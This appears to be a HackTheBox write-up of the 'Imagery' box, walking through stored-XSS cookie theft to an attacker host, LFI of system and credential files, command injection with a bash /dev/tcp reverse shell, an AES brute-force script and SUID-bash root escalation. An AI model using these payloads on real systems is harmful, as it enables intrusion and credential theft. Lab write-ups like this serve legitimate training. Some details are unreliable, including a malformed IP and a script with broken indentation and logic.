---
title: Imagery
author: Julien Bongars
date: 2025-11
link: "[app.hackthebox.com/machines/Imagery](https://app.hackthebox.com/machines/Imagery)"
banner_path: ../hackthebox.png
tags:
  - HackTheBox
  - Easy
  - Linux
  - Hacking
---

## Summary

Imagery is an Easy Linux box running a Flask/Werkzeug image application on port 8000 (SSH on 22 is public-key only). A "report a bug" form is vulnerable to stored XSS, and because an admin bot browses submitted reports, an `<img onerror>` payload — a `<script>` tag is filtered — exfiltrates the admin's session cookie to the attacker. Replaying that cookie unlocks the admin panel, whose system-log viewer takes a `log_identifier` path with no sanitisation, giving a path-traversal **LFI**. Reading `/etc/passwd`, then `/proc/self/environ` and `/proc/self/cmdline`, locates the app under `/home/web/web` and leaks a `CRON_BYPASS_TOKEN`; reading `app.py` / `utils.py` / `config.py` points at `db.json`, which stores md5 password hashes. The testuser hash cracks to a password.

The testuser account unlocks "in-development" image-transform features gated behind an `is_testuser_account` check. The crop transform builds an ImageMagick command with `shell=True` and unsanitised width/height parameters, so a crafted `height` value injects a bash reverse shell — **RCE as `web`**. Post-shell, the admin bot's source leaks `admin@imagery.htb:strongsandofbeach`. An encrypted backup at `/var/backup/web_20250806_120723.zip.aes` is brute-forced with pyAesCrypt, which yields mark's password. As `mark`, `sudo -l` shows NOPASSWD on `/usr/local/bin/charcol`, a backup tool that can schedule arbitrary commands; scheduling `chmod u+s /bin/bash` and then running `bash -p` gives root. The intended time-sinks: the admin md5 hash never cracks (the plaintext comes from the bot source instead), the bug-report and upload fields resist SQLi and `{{…}}` SSTI, and poisoning `_laurel` or the admin bot leads nowhere because the bot already runs as `web`.

---

## Recon

### Port scanning

There is no service on 80/443; the app lives on 8000. The draft did not capture raw scan output — only the summary the author noted:

```txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
|
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
```

SSH is open but requires a key, so the way in is expected to be through the web app.

### Enumeration

The site exposes a support address `support@imagery.com`. Wappalyzer shows nothing and the JavaScript looks like a static app at first glance. `gobuster` finds the real routes:

```txt
/images               (Status: 200) [Size: 49]
/login                (Status: 405) [Size: 153]
/register             (Status: 405) [Size: 153]
/logout               (Status: 405) [Size: 153]
```

The server banner is `Werkzeug/3.1.3 Python/3.12.7` — a Flask application. Registering and logging in with a throwaway account (`test@test.com` / `test`) gets past the front door.

#### Report-a-bug form

The bug-report screen has `name` and `details` fields; both accept text but `sqlmap` finds nothing injectable, so SQLi is ruled out and the form is earmarked for an XSS angle instead.

---

## Stage 1: Stored XSS → admin session theft

An admin bot crawls submitted bug reports using admin credentials — worth assuming this pattern exists on other HTB boxes too. A `<script>` tag is filtered, but an `<img>` `onerror` handler is not, and the outbound image request is not blocked. The payload fires an image request to the attacker carrying `document.cookie`:

```html
<img
  sRC="x"
  onErRor="new Image().src = 'http://1010.14.63:7080/wallpaper.png?c=' + document.cookie"
/>
```

The listener catches the bot's callback with the admin cookie:

```bash
┌─[eu-dedivip-1]─[10.10.14.63]─[julien23@htb-b1k4xv4cpx]─[~]
└──╼ [★]$ sudo nc -lvnp 7080
listening on [any] 7080 ...

connect to [10.10.14.63] from (UNKNOWN) [10.129.95.86] 53010
GET /image.png?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM HTTP/1.1
Host: 10.10.14.63:7080
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

The admin cookie is `.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM`. Set it directly in the browser rather than re-hosting the page:

```js
document.cookie =
  `.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM `;
```

The admin panel is now reachable. For SPA-style apps where the source is available, code review of how values are rendered is usually more productive than editing the page locally.

Stage result: an authenticated admin session.

---

## Stage 2: Admin panel LFI → source disclosure & credentials

### System-log reader (intended function)

The admin panel has per-user log links. The intended request reads a named log file:

request

```txt
GET /admin/get_system_log?log_identifier=admin%40imagery.htb.log HTTP/1.1
Host: 10.129.95.86:8000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.95.86:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM
If-None-Match: "1760055248.564716-1378-2828407261"
If-Modified-Since: Fri, 10 Oct 2025 00:14:08 GMT
Connection: keep-alive
```

response

```txt
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 10 Oct 2025 05:22:18 GMT
Content-Disposition: attachment; filename="admin@imagery.htb.log"
Content-Type: text/plain; charset=utf-8
Content-Length: 2226
Last-Modified: Fri, 10 Oct 2025 05:22:08 GMT
Cache-Control: no-cache
ETag: "1760073728.6669803-2226-2828407261"
Date: Fri, 10 Oct 2025 05:22:18 GMT
Vary: Cookie
Connection: close

[2025-10-10T05:00:08.941481] Logged in successfully.
[2025-10-10T05:00:08.942656] Logged in successfully.
[2025-10-10T05:01:08.452129] Logged in successfully.
[2025-10-10T05:02:08.894072] Logged in successfully.
[2025-10-10T05:02:08.895398] Logged in successfully.
```

### LFI → /etc/passwd

`log_identifier` is a raw path. Swapping it for a traversal string reads arbitrary files:

request

```txt
GET /admin/get_system_log?log_identifier=../../../../../../../etc/passwd HTTP/1.1
Host: 10.129.95.86:8000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.95.86:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOhMxQ.aJ3yxeyHE9oJo-gQHnAxWLVkvjM
If-None-Match: "1760055248.564716-1378-2828407261"
If-Modified-Since: Fri, 10 Oct 2025 00:14:08 GMT
Connection: keep-alive
```

response

```txt
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 10 Oct 2025 05:23:00 GMT
Content-Disposition: attachment; filename=passwd
Content-Type: text/plain; charset=utf-8
Content-Length: 1982
Last-Modified: Mon, 22 Sep 2025 19:11:49 GMT
Cache-Control: no-cache
ETag: "1758568309.7066295-1982-370479508"
Date: Fri, 10 Oct 2025 05:23:00 GMT
Vary: Cookie
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

The interactive users are `web` (uid 1001), `mark` (uid 1002), and `_laurel` (the auditd log user).

### /proc leaks → app source

The same LFI reads process files. `/proc/self/environ` leaks a cron token, and `/proc/self/cmdline` gives the app's launch path:

- `/proc/self/environ` → `CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!` (used by the admin crawler bot)
- `/proc/self/cmdline` → `/home/web/web/env/bin/python app.py`

Assuming the project root is `/home/web/web`, `cat /home/web/web/app.py` pulls the source, and its imports lead to `config.py` and `utils.py`. In `utils.py`, `_load_data` and `config.py` reveal where the credential store lives:

```py
def _load_data():
    if not os.path.exists(DATA_STORE_PATH):
        return {'users': [], 'images': [], 'bug_reports': [], 'image_collections': []}
    with open(DATA_STORE_PATH, 'r') as f:
        data = json.load(f)
    for user in data.get('users', []):
        if 'isTestuser' not in user:
            user['isTestuser'] = False
    return data

DATA_STORE_PATH = 'db.json'
```

### Credential store (db.json) → crack testuser

Reading `db.json` through the LFI dumps the user records:

```json
{
  "users": [
    {
      "username": "admin@imagery.htb",
      "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
      "isAdmin": true,
      "displayId": "a1b2c3d4",
      "login_attempts": 0,
      "isTestuser": false,
      "failed_login_attempts": 0,
      "locked_until": null
    },
    {
      "username": "testuser@imagery.htb",
      "password": "2c65c8d7bfbca32a3ed42596192384f6",
      "isAdmin": false,
      "displayId": "e5f6g7h8",
      "login_attempts": 0,
      "isTestuser": true,
      "failed_login_attempts": 0,
      "locked_until": null
    }
  ],
  "images": [],
  "image_collections": [
    {
      "name": "My Images"
    },
    {
      "name": "Unsorted"
    },
    {
      "name": "Converted"
    },
    {
      "name": "Transformed"
    }
  ],
  "bug_reports": []
}
```

The passwords are md5, per the app's own hashing function:

```py
def _hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

```bash
# Check hash type
hashcat --example-hashes | grep -i md5

# Or use hash-identifier
hash-identifier
# Then paste: 5d9c1d507a3f76af1e5c97a3ad1eaa3
```

```bash
hashcat -m 0 hashes.txt -u /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt --show

john hashes.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rocky
jonh hashes.txt --format=raw-md5 --show
```

Only the testuser hash cracks:

```txt
testuser:iambatman
```

### Dead end: admin hash won't crack

The admin md5 (`5d9c1d507a3f76af1e5c97a3ad1eaa31`) does not fall to rockyou. The admin plaintext turns up later in the bot's source instead (Stage 3), so this hash is a dead end — password reuse between admin and testuser was suspected but doesn't hold.

### Dead end: SSTI and token probing

The upload endpoint was probed for template injection with `{{8*8}}` in `title` / `description` / `group_name`, alongside a PHP-in-PNG upload:

request

```xml
POST /upload_image HTTP/1.1
Host: 10.129.98.227:8000
Content-Length: 549
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycuNjsY3LeX8QWD8a
Accept: */*
Origin: http://10.129.98.227:8000
Referer: http://10.129.98.227:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEKgEAMBP-SWkQbQSstfcUR76IEvJyYWIj4d7VQLGdmYQ8IrMuMex-ggTIMVFV1ARmwdiGyQDPirPSw47jQqknQWCZnpLYprf_F6xx6nzaxrz1SMNL9Ya3lPkU4L3GzK_U.aOTH1A.7SKf2mfm6mGMcio-IG-2dqwR1kM
Connection: keep-alive

------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="title"

{{8*8}}
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="description"

{{8*8}}
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="group_name"

{{8*8}} 
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="file"; filename="A.phphp.png"
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>

------WebKitFormBoundarycuNjsY3LeX8QWD8a--
```

response

```xml
POST /upload_image HTTP/1.1
Host: 10.129.98.227:8000
Content-Length: 549
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycuNjsY3LeX8QWD8a
Accept: */*
Origin: http://10.129.98.227:8000
Referer: http://10.129.98.227:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEKgEAMBP-SWkQbQSstfcUR76IEvJyYWIj4d7VQLGdmYQ8IrMuMex-ggTIMVFV1ARmwdiGyQDPirPSw47jQqknQWCZnpLYprf_F6xx6nzaxrz1SMNL9Ya3lPkU4L3GzK_U.aOTH1A.7SKf2mfm6mGMcio-IG-2dqwR1kM
Connection: keep-alive

------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="title"

title
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="description"

description
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="group_name"

{{8*8}} <-- believe this is being sanitized
------WebKitFormBoundarycuNjsY3LeX8QWD8a
Content-Disposition: form-data; name="file"; filename="A.phphp.png"
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>

------WebKitFormBoundarycuNjsY3LeX8QWD8a--
```

The `{{8*8}}` values come back unevaluated (the author's note: `group_name` appears sanitized), so SSTI here is a dead end. The `/auth_status?_t=<date>` heartbeat was also probed — it rejects past/future `_t` values and does not respond to `%7b%7b3*3%7d%7d`, and a separate token `eJyrVkrJLC7ISaz0TFGyUko1MzVKMkpOVdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAJiHLro.aN-ayQ.NEJjFB36KDewBNajIB5W07WKlsQ` does not look like a JWT — both left inconclusive.

Stage result: `testuser:iambatman`, plus full app source and the `CRON_BYPASS_TOKEN`.

---

## Stage 3: testuser dev features → ImageMagick crop RCE

Logging in as `testuser@imagery.htb` shows an ordinary page at first, but the source gates several "in development" features specifically for the test account:

```py
if not session.get('is_testuser_account'):
    return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
```

One of those features is image transformation. The crop path builds a shell command string and runs it with `shell=True`, interpolating `width`/`height`/`x`/`y` straight in:

```py
try:
    unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
    output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
    output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
    if transform_type == 'crop':
        x = str(params.get('x'))
        y = str(params.get('y'))
        width = str(params.get('width'))
        height = str(params.get('height'))
        command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
        subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

Because the params are unsanitised and `shell=True`, a crafted `height` breaks out of the ImageMagick command. Upload an image, then trigger the crop transform with a reverse shell in `height`:

```txt
POST /apply_visual_transform HTTP/1.1
Host: 10.129.242.164:8000
Content-Length: 189
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.129.242.164:8000
Referer: http://10.129.242.164:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aOjCGw.izwREOZmmjTQ601z6hR4adRLIMI
Connection: keep-alive

{"imageId":"f24fff97-819a-4cf1-944c-b2c3d758d774","transformType":"crop","params":{"x":0,"y":0,"width":680,        "height": "500; bash -c 'bash -i >& /dev/tcp/10.10.14.63/7080 0>&1' #"}
}
```

This lands a reverse shell as `web`. Reading the admin bot's source from the shell leaks the admin plaintext directly (which is why the md5 crack was unnecessary):

```txt
USERNAME = "admin@imagery.htb"
PASSWORD = "strongsandofbeach"
```

SSH won't take that password — `/etc/ssh/sshd_config` is public-key only:

```toml
PubkeyAuthentication yes
ChallengeResponseAuthentication no

# ... 

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
#PermitEmptyPasswords no
```

So `strongsandofbeach` doesn't get an SSH session, and there's no read access to mark's key. Lateral movement has to come from on-box material.

Stage result: a reverse shell as `web`; admin creds `admin@imagery.htb:strongsandofbeach`.

---

## Stage 4: web → mark (encrypted backup)

### Dead end: poison _laurel / poison the admin bot

Two lateral-movement ideas went nowhere. The admin bot runs on a cron as the `web` user — the same user already owned — so poisoning it grants no new privilege:

```bash
* * * * * python3 /home/web/web/bot/admin.py
```

Poisoning `_laurel` (the auditd log sink) was considered but not pursued.

### Encrypted backup → AES crack → mark

An encrypted backup sits in the backups directory:

```txt
/var/backup/web_20250806_120723.zip.aes
```

Brute-force the AES password with a small pyAesCrypt wrapper:

```py
import sys
import pyAesCrypt
import os

BUFFER_SIZE = 64 * 1024

def try_password(encfile, outfile, password):
if os.path.exists(outfile):
try:
os.remove(outfile)
except OSError:
pass
try:
pyAesCrypt.decryptFile(encfile, outfile, password, BUFFER_SIZE)
with open(outfile, "rb") as f:
head = f.read(4)
if head.startswith(b"PK"):
return True
return True
except Exception:
if os.path.exists(outfile):
try:
os.remove(outfile)
except OSError:
pass
return False

def main():
if len(sys.argv) != 4:
print("Usage: python3 pyaes_decrypt.py encrypted_file wordlist_or_dash output_file")
sys.exit(2)

    encfile = sys.argv[1]
    wordlist = sys.argv[2]
    outfile = sys.argv[3]

    def candidates():
        if wordlist == "-":
            for line in sys.stdin:
                yield line.rstrip("\n\r")
        else:
            with open(wordlist, "r", errors="ignore") as f:
                for line in f:
                    yield line.rstrip("\n\r")

    count = 0
    for pwd in candidates():
        count += 1
        if count % 1000 == 0:
            print(f"[+] tried {count} candidates...", flush=True)
        if pwd == "":
            continue
        if try_password(encfile, outfile, pwd):
            print(f"\n[+] SUCCESS! Password found: {pwd!r}")
            print(f"[+] Output written to: {outfile}")
            return
    print("\n[-] Finished list; no password found.")

if **name** == "**main**":
main()
```

```txt
password for mark is: supersmash
```

Stage result: `mark:supersmash`.

---

## Stage 5: mark → root (charcol sudo)

As `mark`, `sudo -l` shows one NOPASSWD entry:

```bash
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

`charcol` is a backup tool that can schedule arbitrary commands. First reset its password back to default:

```bash
```

<!-- TODO: the charcol password-reset command was an empty code block in the draft — not captured. -->

Then add a cron entry that sets the SUID bit on `/bin/bash`:

```bash
charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "sh mark"
```

Wait for the scheduled command to run, then launch a privileged shell:

```bash
sleep 60 && /bin/bash -p
```

> **Note**
>
> the relevant section of the bash man page reads as follows
>
> ```txt
> -p      Turn  on  privileged mode.  In this mode, the shell does not
>        read the $ENV and $BASH_ENV files, shell functions  are  not
>        inherited from the environment, and the SHELLOPTS, BASHOPTS,
>        CDPATH,  and GLOBIGNORE variables, if they appear in the en‐
>        vironment, are ignored.  If the shell is  started  with  the
>        effective user (group) id not equal to the real user (group)
>        id,  and  the  -p  option is not supplied, these actions are
>        taken and the effective user id is set to the real user  id.
>        If  the -p option is supplied at startup, the effective user
>        id is not reset.  Turning this option off causes the  effec‐
>        tive user and group ids to be set to the real user and group
>        ids.
> ```

`chmod u+s /bin/bash` runs as root via the charcol cron, and `bash -p` keeps the root euid instead of dropping it — giving a root shell.

Stage result: root. The draft records both flags together (without showing the read commands):

---

## Credentials

| Source                                    | Credential                                                                  | Notes                          |
| ----------------------------------------- | --------------------------------------------------------------------------- | ------------------------------ |
| XSS cookie theft (admin bot)              | admin session cookie `.eJw9jbEO…aJ3yxeyHE9oJo-gQHnAxWLVkvjM`                | Grants admin panel             |
| `db.json` (via LFI)                       | `admin@imagery.htb` md5 `5d9c1d507a3f76af1e5c97a3ad1eaa31`                  | Not cracked                    |
| `db.json` (via LFI)                       | `testuser@imagery.htb` md5 `2c65c8d7bfbca32a3ed42596192384f6` → `iambatman` | Cracked (rockyou)              |
| `/proc/self/environ` (via LFI)            | `CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!`                              | Admin crawler token            |
| Admin bot source (post-`web` shell)       | `admin@imagery.htb:strongsandofbeach`                                       | Plaintext; SSH disabled for it |
| `/var/backup/web_20250806_120723.zip.aes` | AES password `bestfriends`                                                  | Brute-forced with pyAesCrypt   |
| Decrypted backup                          | `mark:supersmash`                                                           | Lateral move to mark           |

---

## Key lessons

- **Assume an admin bot on stored-XSS boxes.** A "report a bug" form plus a crawler running admin creds is a cookie-theft setup. Filtered `<script>`? An `<img onerror>` still fires an outbound request and carries `document.cookie` — worth keeping in the XSS toolkit as a `<script>`-filter bypass.
- **When the source is readable, read it.** LFI on `/proc/self/cmdline` and `/proc/self/environ` gave the app path and a cron token; reading `app.py`/`utils.py`/`config.py` located `db.json` and, crucially, the `is_testuser_account`-gated features and the `shell=True` crop sink. Code review found the real paths faster than blind fuzzing.
- **`shell=True` with user-controlled parameters is command injection.** The crop transform interpolated `height` straight into a shell string — a `; bash -c '…' #` in that field is RCE.
- **Don't fixate on cracking a hash you don't need.** The admin md5 never fell; the plaintext (`strongsandofbeach`) was sitting in the bot source. Enumerate reachable material before grinding a wordlist.
- **`bash -p` preserves the SUID euid.** With `/bin/bash` made SUID-root by the charcol cron, `bash -p` is what actually retains root instead of dropping back to the real uid (see the man-page note).

### What went right

- Methodical code review of the readable app paid off — the testuser feature gate and the `shell=True` sink both came straight from the source.
- Recognising the XSS/admin-bot pattern turned the bug-report form into admin access quickly.

---

## Tools & cheat sheet

| Tool                      | Purpose in this box                                 | Key command                                                                       |
| ------------------------- | --------------------------------------------------- | --------------------------------------------------------------------------------- |
| `gobuster`                | Route discovery on the Flask app                    | `gobuster dir -u http://<ip>:8000/ -w <wordlist>`                                 |
| Burp Suite                | XSS delivery, LFI, upload + transform RCE           | repeat `/admin/get_system_log` and `/apply_visual_transform` requests             |
| `nc`                      | Catch the XSS cookie callback and the reverse shell | `sudo nc -lvnp 7080`                                                              |
| `<img onerror>` payload   | Exfil admin cookie past the `<script>` filter       | `<img sRC="x" onErRor="new Image().src='http://<ip>:7080/x?c='+document.cookie">` |
| `hashcat` / `john`        | Crack the md5 password hashes                       | `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`                        |
| pyAesCrypt script         | Brute-force the AES backup password                 | `python3 pyaes_decrypt.py web_20250806_120723.zip.aes rockyou.txt out.zip`        |
| `/apply_visual_transform` | ImageMagick crop `shell=True` injection → RCE       | `"height": "500; bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' #"`               |
| `charcol` (sudo NOPASSWD) | Schedule root command → SUID bash                   | `auto add --schedule "* * * * *" --command "chmod u+s /bin/bash"`                 |
| `bash -p`                 | Root shell from SUID `/bin/bash`                    | `sleep 60 && /bin/bash -p`                                                        |
